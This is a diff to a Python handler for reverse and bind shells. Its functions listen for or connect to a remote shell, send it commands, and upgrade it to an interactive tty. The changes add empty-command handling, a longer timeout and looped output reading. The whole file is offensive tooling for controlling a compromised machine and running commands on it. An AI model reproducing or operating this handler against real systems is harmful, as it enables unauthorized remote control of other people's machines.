@@ -24,7 +24,7 @@ def reverse(port):
         print("[+] SUCCESSFUL CONNECTION")
         print(a.recv(1024).decode('utf-8'))
         print('[!] Interactive shell to check >> use command shell_check')
-        a.settimeout(2)
+        a.settimeout(3)
         host=str.encode('id -u -n')
         a.send(host)
         hostname=a.recv(1024).decode('utf-8')
@@ -40,9 +40,15 @@ def reverse(port):
                     print('[*] Interactıve shell checked...')
                     a.send(str.encode(tty+'\n'))
                     print(a.recv(1024).decode('utf-8'))
+                elif command == "\n" or command == "":
+                    print("[E] No command entered")
+                    continue
                 else:
                     a.send(str.encode(command))
-                    print(a.recv(50000).decode('utf-8'))
+                    while True:
+                        data_check=a.recv(8192).decode('utf-8')
+                        if len(data_check) > 0:
+                            print(data_check)
             except socket.timeout:
                 pass
             except socket.error:
@@ -74,10 +80,16 @@ def bind(ip,port) :
                 elif "shell_check".lower() in command:
                     bindshell.send(str.encode(tty+'\n'))
                     print(bindshell.recv(1024).decode('utf-8'))
-                
+                elif command == "\n" or command == "":
+                    print("[E] No command entered")
+                    continue
+
                 else:
                     bindshell.send(str.encode(command))
-                    print(bindshell.recv(50000).decode('utf-8'))
+                    while True:
+                        data_check=bindshell.recv(8192).decode('utf-8')
+                        if len(data_check) > 0:
+                            print(data_check)
             except socket.timeout:
                 pass
             except socket.error:
@@ -103,5 +115,4 @@ if __name__=='__main__':
     elif("-R" in sys.argv[1]):
         reverse(sys.argv[2])
     
-
 
